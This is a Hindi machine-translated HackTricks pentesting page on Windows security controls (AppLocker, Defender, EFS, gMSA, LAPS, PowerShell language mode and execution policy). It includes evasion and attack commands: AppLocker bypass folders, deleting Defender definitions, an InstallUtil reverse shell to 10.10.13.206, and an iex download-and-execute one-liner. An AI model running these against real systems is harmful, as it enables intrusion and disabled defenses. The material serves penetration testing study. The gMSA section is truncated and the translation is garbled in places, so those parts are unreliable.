# Windows सुरक्षा नियंत्रण

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** ट्विटर पर **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **अपने हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos को PRs सबमिट करके।

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें और **दुनिया के सबसे उन्नत समुदाय उपकरणों द्वारा संचालित** **कार्यप्रवाहों** को आसानी से निर्माण और स्वचालित करें।\
आज ही पहुंचें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker नीति

एक एप्लिकेशन व्हाइटलिस्ट एक सूची है जिसमें स्वीकृत सॉफ्टवेयर एप्लिकेशन या एक्जीक्यूटेबल्स शामिल हैं जिन्हें एक सिस्टम पर मौजूद होने और चलाने की अनुमति है। उद्देश्य हानिकारक मैलवेयर और अनुमोदित सॉफ्टवेयर से पर्यावरण की सुरक्षा करना है जो किसी संगठन की विशेष व्यवसायिक आवश्यकताओं के साथ मेल नहीं खाता।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) माइक्रोसॉफ्ट का **एप्लिकेशन व्हाइटलिस्टिंग समाधान** है और सिस्टम प्रशासकों को **उन एप्लिकेशन्स और फ़ाइलों पर नियंत्रण प्रदान करता है** जो उपयोगकर्ता चला सकते हैं। यह **एक्जीक्यूटेबल्स, स्क्रिप्ट्स, Windows स्थापक फ़ाइलें, DLLs, पैकेज़ किए गए ऐप्स और पैकेज़ किए गए ऐप्स स्थापकों** पर **विस्तारित नियंत्रण** प्रदान करता है।\
संगठनों के लिए **cmd.exe और PowerShell.exe को अवरुद्ध करना** और कुछ निर्दिष्ट निर्देशिकाओं को लिखना सामान्य है, **लेकिन यह सभी को अनदेखा किया जा सकता है**।

### जांचें

जांचें कि कौन सी फ़ाइलें/एक्सटेंशन ब्लैकलिस्ट/व्हाइटलिस्ट की गई हैं:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
यह रजिस्ट्री पथ में व्यवस्थाओं और नीतियों को संजालक द्वारा लागू किया गया है, जो वर्तमान निर्धारित नियमों की समीक्षा करने का एक तरीका प्रदान करता है:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### बायपास

* उपयोगी **लिखने योग्य फ़ोल्डर्स** जो संजालक नीति को बायपास करने के लिए: यदि संजालक किसी भी चीज को `C:\Windows\System32` या `C:\Windows` के अंदर कुछ भी करने की अनुमति दे रहा है, तो यहां **लिखने योग्य फ़ोल्डर्स** हैं जिन्हें आप इसका **बायपास करने** के लिए उपयोग कर सकते हैं।
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* आमतौर पर **विश्वसनीय** [**"LOLBAS's"**](https://lolbas-project.github.io/) बाइनरी एपलॉकर को छलने में उपयोगी हो सकते हैं।
* **खराब तरीके से लिखी गई नियमों को भी छल सकते हैं**
* उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी **`allowed` नामक फ़ोल्डर** बना सकते हैं और इसे अनुमति दी जाएगी।
* संगठन अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` एक्जीक्यूटेबल** को ब्लॉक करने पर ध्यान केंद्रित करते हैं, लेकिन **अन्य** [**PowerShell एक्जीक्यूटेबल स्थान**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe` के बारे में भूल जाते हैं।
* **DLL प्रवर्तन बहुत कम सक्रिय** होता है क्योंकि यह सिस्टम पर डाल सकता है, और सुनिश्चित करने के लिए आवश्यक परीक्षण की मात्रा। इसलिए **DLLs का उपयोग बैकडोर्स के रूप में करने से एपलॉकर को छलने में मदद मिलेगी**।
* आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके **किसी भी प्रक्रिया में Powershell** कोड को निष्पादित करने और एपलॉकर को छलने में मदद करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Credentials Storage

### सुरक्षा खाता प्रबंधक (SAM)

स्थानीय परिचय इस फ़ाइल में मौजूद हैं, पासवर्ड हैश होते हैं।

### स्थानीय सुरक्षा प्राधिकरण (LSA) - LSASS

**परिचय** (हैश) इस उपप्रणाली की **स्मृति** में सहेजे जाते हैं एकल साइन-ऑन कारणों के लिए।\
**LSA** स्थानीय **सुरक्षा नीति** (पासवर्ड नीति, उपयोगकर्ता अनुमतियाँ...) का प्रबंधन करता है, **प्रमाणीकरण**, **पहुंच टोकन**...\
LSA वह होगा जो **प्रदान किए गए परिचय** के लिए **SAM** फ़ाइल में (स्थानीय लॉगिन के लिए) और डोमेन उपयोगकर्ता को प्रमाणित करने के लिए **डोमेन नियंत्रक** के साथ बातचीत करेगा।

**परिचय** **प्रक्रिया LSASS** में सहेजे जाते हैं: कर्बेरोस टिकट, हैश NT और LM, आसानी से डिक्रिप्ट किए गए पासवर्ड।

### LSA रहस्य

LSA डिस्क में कुछ परिचय सहेज सकता है:

* सक्रिय नहीं डोमेन नियंत्रक के कंप्यूटर खाते का पासवर्ड।
* विंडोज सेवाओं के खातों के पासवर्ड
* निर्धारित कार्यों के लिए पासवर्ड
* अधिक (IIS एप्लिकेशनों का पासवर्ड...)

### NTDS.dit

यह एक्टिव डायरेक्ट्री का डेटाबेस है। यह केवल डोमेन नियंत्रकों में मौजूद है।

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) एक एंटीवायरस है जो Windows 10 और Windows 11 में उपलब्ध है, और Windows सर्वर के संस्करणों में। यह **सामान्य पेंटेस्टिंग उपकरणों** जैसे **`WinPEAS`** को **ब्लॉक** करता है। हालांकि, इन सुरक्षाओं को **छलने** के तरीके हैं।

### जाँच

**Defender** की **स्थिति** की जाँच करने के लिए आप PS cmdlet **`Get-MpComputerStatus`** को निष्पादित कर सकते हैं (जानने के लिए कि क्या यह सक्रिय है, **`RealTimeProtectionEnabled`** के मान की जाँच करें):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे जाँचने के लिए आप भी चला सकते हैं:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## एन्क्रिप्टेड फ़ाइल सिस्टम (EFS)

EFS एन्क्रिप्शन के माध्यम से फ़ाइलों को सुरक्षित करता है, जिसमें **सममित कुंजी** का उपयोग किया जाता है जिसे **फ़ाइल एन्क्रिप्शन कुंजी (FEK)** के रूप में जाना जाता है। यह कुंजी उपयोगकर्ता की **सार्वजनिक कुंजी** के साथ एन्क्रिप्ट की जाती है और एन्क्रिप्टेड फ़ाइल के $EFS **वैकल्पिक डेटा स्ट्रीम** में संग्रहीत की जाती है। जब डिक्रिप्शन की आवश्यकता होती है, तो उपयोगकर्ता के डिजिटल प्रमाणपत्र की संबंधित **निजी कुंजी** का उपयोग किया जाता है जो $EFS स्ट्रीम से FEK को डिक्रिप्ट करने के लिए। अधिक विवरण यहाँ [मिल सकते हैं](https://en.wikipedia.org/wiki/Encrypting_File_System)।

**उपयोगकर्ता प्रारंभिकरण के बिना डिक्रिप्शन स्थितियाँ** शामिल हैं:

- जब फ़ाइलें या फ़ोल्डर्स को [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) जैसे गैर-EFS फ़ाइल सिस्टम में ले जाया जाता है, तो वे स्वचालित रूप से डिक्रिप्ट हो जाते हैं।
- SMB/CIFS प्रोटोकॉल के माध्यम से नेटवर्क के जरिए भेजी गई एन्क्रिप्टेड फ़ाइलें पहले ही डिक्रिप्ट हो जाती हैं।

यह एन्क्रिप्शन विधि एन्क्रिप्टेड फ़ाइलों तक के लिए मालिक के लिए **पारदर्शी पहुंच** सुनिश्चित करती है। हालांकि, बस मालिक के पासवर्ड बदलना और लॉग इन करना डिक्रिप्शन की अनुमति नहीं देगा।

**मुख्य बातें**:
- EFS एक सममित FEK का उपयोग करता है, जिसे उपयोगकर्ता की सार्वजनिक कुंजी से एन्क्रिप्ट किया जाता है।
- डिक्रिप्शन में उपयोगकर्ता की निजी कुंजी का उपयोग FEK तक पहुंचने के लिए किया जाता है।
- विशेष स्थितियों में स्वचालित डिक्रिप्शन होता है, जैसे FAT32 पर कॉपी करना या नेटवर्क प्रेषण।
- एन्क्रिप्टेड फ़ाइलें मालिक के लिए बिना अतिरिक्त कदमों के पहुंचनीय हैं।

### EFS जानकारी जांचें

जांचें कि क्या **उपयोगकर्ता** ने **इस सेवा** का **उपयोग** किया है इस पथ की जांच करके: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

फ़ाइल का एक्सेस किसके पास है यह जांचें `cipher /c \<file>\`
आप `cipher /e` और `cipher /d` का उपयोग एक फ़ोल्डर के भीतर सभी फ़ाइलों को **एन्क्रिप्ट** और **डिक्रिप्ट** करने के लिए कर सकते हैं

### EFS फ़ाइलों का डिक्रिप्ट करना

#### प्राधिकरण प्रणाली होना

इस तरीके में **शिकार उपयोगकर्ता** को **मेज़बान प्रयोक्ता** को **होस्ट के भीतर चल रहे प्रक्रिया** का उपयोग करने की आवश्यकता होती है। यदि ऐसा है, तो `meterpreter` सत्र का उपयोग करके आप उपयोक्ता की प्रक्रिया के टोकन का अनुकरण कर सकते हैं (`incognito` से `impersonate_token`)। या तो आप उपयोक्ता की प्रक्रिया में `migrate` कर सकते हैं।

#### उपयोक्ता के पासवर्ड जानना

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## समूह प्रबंधित सेवा खाते (gMSA)

माइक्रोसॉफ्ट ने **समूह प्रबंधित सेवा खाते (gMSA)** विकसित किए हैं ताकि आईटी ढांचे में सेवा खातों का प्रबंधन सरल हो। इसके विपरीत, जो अक्सर "**पासवर्ड कभी समाप्त नहीं होता**" सेटिंग सक्षम होती है, gMSAs एक अधिक सुरक्षित और प्रबंधनीय समाधान प्रदान करते हैं:

- **स्वचालित पासवर्ड प्रबंधन**: gMSAs एक जटिल, 240-वर्णीय पासवर्ड का उपयोग करते हैं जो डोमेन या कंप्यूटर नीति के अनुसार स्वचालित रूप से बदलता है। यह प्रक्रिया माइक्रोसॉफ्ट की की वितरण सेवा (KDC) द्वारा संभाली जाती है, जिससे मैनुअल पासवर्ड अपड
```
/GMSAPasswordReader --AccountName jkohler
```
**[इस पोस्ट में अधिक जानकारी पाएं](https://cube0x0.github.io/Relaying-for-gMSA/)**

इस [वेब पेज](https://cube0x0.github.io/Relaying-for-gMSA/) की जाँच करें कि **NTLM रिले हमला** कैसे किया जाता है ताकि **gMSA** के **पासवर्ड** को **पढ़ा** जा सके।

## LAPS

**स्थानीय प्रशासक पासवर्ड समाधान (LAPS)**, जो [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से डाउनलोड के लिए उपलब्ध है, स्थानीय प्रशासक पासवर्डों का प्रबंधन संभव बनाता है। ये पासवर्ड **रैंडमाइज़** होते हैं, अद्वितीय होते हैं, और **नियमित रूप से बदलते** हैं, जो केंद्रीय रूप से सक्रिय निर्देशिका में संग्रहीत होते हैं। इन पासवर्डों तक पहुंच केवल अधिकृत उपयोगकर्ताओं को ACLs के माध्यम से प्रतिबंधित किया जाता है। पर्याप्त अनुमतियों के साथ, स्थानीय प्रशासक पासवर्ड पढ़ने की क्षमता प्रदान की जाती है।

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **कई विशेषताओं को बंद कर देता है** जो PowerShell को प्रभावी ढंग से उपयोग करने के लिए आवश्यक होती हैं, जैसे कि COM ऑब्जेक्ट्स को ब्लॉक करना, केवल मंजूर .NET प्रकारों को ही अनुमति देना, XAML-आधारित वर्कफ़्लो, PowerShell क्लासेस, और अधिक।

### **जाँच करें**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### बायपास
```powershell
#Easy bypass
Powershell -version 2
```
In current Windows उस बाइपास काम नहीं करेगा लेकिन आप **PSByPassCLM** का उपयोग कर सकते हैं।\
**इसे कंपाइल करने के लिए आपको शायद जरूरत होगी** **एक संदर्भ जोड़ने के लिए** -> _ब्राउज़_ ->_ब्राउज़_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ें और **परियोजना को .Net4.5 में बदलें**।

#### सीधा बाइपास:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### रिवर्स शैल:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग कर सकते हैं **पावरशेल** कोड को किसी भी प्रक्रिया में निष्क्रिय करने और सीमित मोड को छलकरने के लिए। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS निष्क्रियता नीति

डिफ़ॉल्ट रूप से यह **सीमित** पर सेट किया गया है। इस नीति को छलकरने के मुख्य तरीके:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
## सुरक्षा समर्थन प्रदाता इंटरफेस (SSPI)

यह एपीआई उपयोगकर्ताओं की प्रमाणीकरण के लिए उपयोग किया जा सकता है।

SSPI को दो मशीनों के बीच संचार करना चाहते हैं उनके लिए उपयुक्त प्रोटोकॉल खोजने का जिम्मेदार होगा। इसके लिए पसंदीदा विधि के रूप में केरबेरोस है। फिर SSPI यह निर्धारित करेगा कि कौन सा प्रमाणीकरण प्रोटोकॉल उपयोग किया जाएगा, ये प्रमाणीकरण प्रोटोकॉल सुरक्षा समर्थन प्रदाता (SSP) कहलाते हैं, इनके रूप में एक DLL के रूप में प्रत्येक Windows मशीन में स्थित हैं और दोनों मशीनों को संचार करने के लिए एक ही समर्थन करना होगा।

### मुख्य SSPs

* **केरबेरोस**: पसंदीदा
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** और **NTLMv2**: संगति कारण
* %windir%\Windows\System32\msv1\_0.dll
* **डाइजेस्ट**: वेब सर्वर और LDAP, पासवर्ड का एमडी5 हैश के रूप में
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL और TLS
* %windir%\Windows\System32\Schannel.dll
* **नेगोटिएट**: इसका उपयोग प्रोटोकॉल की चर्चा करने के लिए किया जाता है (केरबेरोस या NTLM का उपयोग करने के लिए, केरबेरोस पूर्वनिर्धारित है)
* %windir%\Windows\System32\lsasrv.dll

#### चर्चा कई विधियों को प्रस्तुत कर सकती है या केवल एक।

## UAC - उपयोगकर्ता खाता नियंत्रण

[उपयोगकर्ता खाता नियंत्रण (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक सुविधा है जो **उच्च स्तरीय गतिविधियों के लिए सहमति प्रॉम्प्ट** सक्षम करती है।
